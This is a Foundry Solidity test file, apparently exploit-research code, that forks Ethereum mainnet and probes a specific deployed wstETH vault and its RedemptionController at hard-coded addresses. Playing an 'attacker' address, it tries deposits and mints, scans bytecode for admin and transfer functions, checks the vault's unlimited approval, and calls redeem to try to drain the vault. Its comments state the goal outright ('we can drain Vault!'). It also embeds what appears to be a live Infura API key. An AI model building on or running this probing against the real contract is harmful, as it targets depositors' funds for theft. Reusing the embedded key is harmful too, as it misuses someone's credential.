// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function mint(uint256 shares, address receiver) external returns (uint256);
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function previewDeposit(uint256 assets) external view returns (uint256);
    function previewWithdraw(uint256 assets) external view returns (uint256);
    function maxDeposit(address) external view returns (uint256);
    function maxWithdraw(address owner) external view returns (uint256);
}

contract VaultDepositExploit is Test {
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeVaultInterface() public view {
        console.log("=== ANALYZING VAULT INTERFACE ===\n");

        IVault vault = IVault(VAULT);

        // Check basic ERC4626 info
        console.log("Vault address:", VAULT);

        (bool success, bytes memory data) = VAULT.staticcall(
            abi.encodeWithSignature("asset()")
        );
        if (success && data.length == 32) {
            address asset = abi.decode(data, (address));
            console.log("Asset:", asset);
            console.log("Is wstETH:", asset == wstETH);
        }

        (success, data) = VAULT.staticcall(
            abi.encodeWithSignature("totalAssets()")
        );
        if (success && data.length == 32) {
            uint256 total = abi.decode(data, (uint256));
            console.log("Total assets:", total / 1e18);
        }

        (success, data) = VAULT.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (success && data.length == 32) {
            uint256 supply = abi.decode(data, (uint256));
            console.log("Total supply (shares):", supply / 1e18);
        }

        // Check max functions
        (success, data) = VAULT.staticcall(
            abi.encodeWithSignature("maxDeposit(address)", attacker)
        );
        if (success && data.length == 32) {
            uint256 maxDep = abi.decode(data, (uint256));
            console.log("Max deposit for attacker:", maxDep);
        }

        (success, data) = VAULT.staticcall(
            abi.encodeWithSignature("maxWithdraw(address)", attacker)
        );
        if (success && data.length == 32) {
            uint256 maxWith = abi.decode(data, (uint256));
            console.log("Max withdraw for attacker:", maxWith);
        }
    }

    function test_TryVaultDeposit() public {
        console.log("=== TRYING VAULT DEPOSIT ===\n");

        // Get some wstETH
        deal(wstETH, attacker, 10e18);
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);

        vm.startPrank(attacker);

        // Approve vault
        IERC20(wstETH).approve(VAULT, type(uint256).max);

        // Try to deposit
        console.log("\nTrying deposit(1e18, attacker)...");
        try IVault(VAULT).deposit(1e18, attacker) returns (uint256 shares) {
            console.log("Deposit succeeded! Shares:", shares / 1e18);
            console.log("Vault shares balance:", IVault(VAULT).balanceOf(attacker) / 1e18);
        } catch Error(string memory reason) {
            console.log("Deposit failed:", reason);
        } catch (bytes memory data) {
            console.log("Deposit failed (raw):");
            if (data.length >= 4 && data.length < 100) {
                console.logBytes(data);
            }
        }

        vm.stopPrank();
    }

    function test_TryVaultMint() public {
        console.log("=== TRYING VAULT MINT ===\n");

        deal(wstETH, attacker, 10e18);

        vm.startPrank(attacker);
        IERC20(wstETH).approve(VAULT, type(uint256).max);

        console.log("Trying mint(1e18, attacker)...");
        try IVault(VAULT).mint(1e18, attacker) returns (uint256 assets) {
            console.log("Mint succeeded! Assets:", assets / 1e18);
        } catch Error(string memory reason) {
            console.log("Mint failed:", reason);
        } catch (bytes memory data) {
            console.log("Mint failed (raw):");
            if (data.length >= 4 && data.length < 100) {
                console.logBytes(data);
            }
        }

        vm.stopPrank();
    }

    function test_CheckVaultFunctions() public view {
        console.log("=== CHECKING VAULT FUNCTION SELECTORS ===\n");

        bytes memory code = VAULT.code;
        console.log("Vault code size:", code.length);

        // Look for function selectors
        bytes4[] memory selectors = new bytes4[](20);
        selectors[0] = bytes4(keccak256("deposit(uint256,address)"));
        selectors[1] = bytes4(keccak256("withdraw(uint256,address,address)"));
        selectors[2] = bytes4(keccak256("redeem(uint256,address,address)"));
        selectors[3] = bytes4(keccak256("mint(uint256,address)"));
        selectors[4] = bytes4(keccak256("withdraw(address,uint256)"));
        selectors[5] = bytes4(keccak256("allocate(uint256,uint256)"));
        selectors[6] = bytes4(keccak256("deallocate(uint256,uint256)"));
        selectors[7] = bytes4(keccak256("harvest()"));
        selectors[8] = bytes4(keccak256("rebalance()"));
        selectors[9] = bytes4(keccak256("execute(address,bytes)"));
        selectors[10] = bytes4(keccak256("multicall(bytes[])"));
        selectors[11] = bytes4(keccak256("setStrategy(address)"));
        selectors[12] = bytes4(keccak256("addStrategy(address)"));
        selectors[13] = bytes4(keccak256("removeStrategy(address)"));
        selectors[14] = bytes4(keccak256("sweep(address,address)"));
        selectors[15] = bytes4(keccak256("rescueTokens(address,address,uint256)"));
        selectors[16] = bytes4(keccak256("pause()"));
        selectors[17] = bytes4(keccak256("unpause()"));
        selectors[18] = bytes4(keccak256("transferOwnership(address)"));
        selectors[19] = bytes4(keccak256("acceptOwnership()"));

        string[20] memory names = [
            "deposit(uint256,address)",
            "withdraw(uint256,address,address)",
            "redeem(uint256,address,address)",
            "mint(uint256,address)",
            "withdraw(address,uint256)",
            "allocate",
            "deallocate",
            "harvest",
            "rebalance",
            "execute",
            "multicall",
            "setStrategy",
            "addStrategy",
            "removeStrategy",
            "sweep",
            "rescueTokens",
            "pause",
            "unpause",
            "transferOwnership",
            "acceptOwnership"
        ];

        console.log("Searching for function selectors:");
        for (uint s = 0; s < selectors.length; s++) {
            for (uint i = 0; i + 3 < code.length; i++) {
                bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
                if (sel == selectors[s]) {
                    console.log("  Found:", names[s]);
                    break;
                }
            }
        }
    }

    function test_AnalyzeVaultApprovals() public view {
        console.log("=== ANALYZING VAULT APPROVALS ===\n");

        // Vault has approved RedemptionController for MAX wstETH
        // This is the critical approval

        uint256 approval = IERC20(wstETH).allowance(VAULT, REDEMPTION_CONTROLLER);
        console.log("Vault -> RedemptionController approval:");
        if (approval == type(uint256).max) {
            console.log("  MAX (unlimited)");
        } else {
            console.log("  ", approval / 1e18, "wstETH");
        }

        // Check if there are other significant approvals
        address[] memory spenders = new address[](5);
        spenders[0] = STRATEGY_0;
        spenders[1] = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; // Aave
        spenders[2] = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; // wstETH
        spenders[3] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // stETH
        spenders[4] = 0x1111111254EEB25477B68fb85Ed929f73A960582; // 1inch

        string[5] memory names = ["Strategy0", "Aave", "wstETH", "stETH", "1inch"];

        console.log("\nOther Vault approvals:");
        for (uint i = 0; i < spenders.length; i++) {
            approval = IERC20(wstETH).allowance(VAULT, spenders[i]);
            if (approval > 0) {
                console.log("  ", names[i], ":", approval);
            }
        }
    }

    function test_CheckRedemptionControllerFunctions() public view {
        console.log("=== CHECKING REDEMPTION CONTROLLER FUNCTIONS ===\n");

        // RedemptionController has MAX approval from Vault
        // If we can trigger it to call transferFrom, we can drain

        bytes memory code = REDEMPTION_CONTROLLER.code;
        console.log("RedemptionController code size:", code.length);

        // Look for transferFrom selector
        bytes4 transferFromSel = bytes4(keccak256("transferFrom(address,address,uint256)"));
        console.log("transferFrom selector:");
        console.logBytes4(transferFromSel);

        bool hasTransferFrom = false;
        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == transferFromSel) {
                hasTransferFrom = true;
                console.log("  Found transferFrom at offset:", i);
            }
        }

        if (hasTransferFrom) {
            console.log("\nCRITICAL: RedemptionController can call transferFrom!");
            console.log("If we can control the params, we can drain Vault!");
        }

        // Check what functions RC exposes
        bytes4[] memory rcSelectors = new bytes4[](10);
        rcSelectors[0] = bytes4(keccak256("redeem(uint256,address)"));
        rcSelectors[1] = bytes4(keccak256("rescueERC20(address,address,uint256)"));
        rcSelectors[2] = bytes4(keccak256("addRedemption(address)"));
        rcSelectors[3] = bytes4(keccak256("removeRedemption(address)"));
        rcSelectors[4] = bytes4(keccak256("pause()"));
        rcSelectors[5] = bytes4(keccak256("unpause()"));
        rcSelectors[6] = bytes4(keccak256("execute(address,bytes)"));
        rcSelectors[7] = bytes4(keccak256("multicall(bytes[])"));
        rcSelectors[8] = bytes4(keccak256("upgradeToAndCall(address,bytes)"));
        rcSelectors[9] = bytes4(keccak256("initialize()"));

        string[10] memory names = [
            "redeem",
            "rescueERC20",
            "addRedemption",
            "removeRedemption",
            "pause",
            "unpause",
            "execute",
            "multicall",
            "upgradeToAndCall",
            "initialize"
        ];

        console.log("\nRedemptionController functions found:");
        for (uint s = 0; s < rcSelectors.length; s++) {
            for (uint i = 0; i + 3 < code.length; i++) {
                bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
                if (sel == rcSelectors[s]) {
                    console.log("  ", names[s]);
                    break;
                }
            }
        }
    }

    function test_TryDirectTransferFrom() public {
        console.log("=== TRYING DIRECT TRANSFERFROM VIA RC ===\n");

        // If RC has transferFrom capability and we can somehow trigger it...

        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Try calling various RC functions
        console.log("\nTrying redeem(1e18, attacker)...");
        (bool success,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1e18, attacker)
        );
        console.log("Success:", success);

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH after:", vaultAfter / 1e18);

        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
        }

        vm.stopPrank();
    }
}
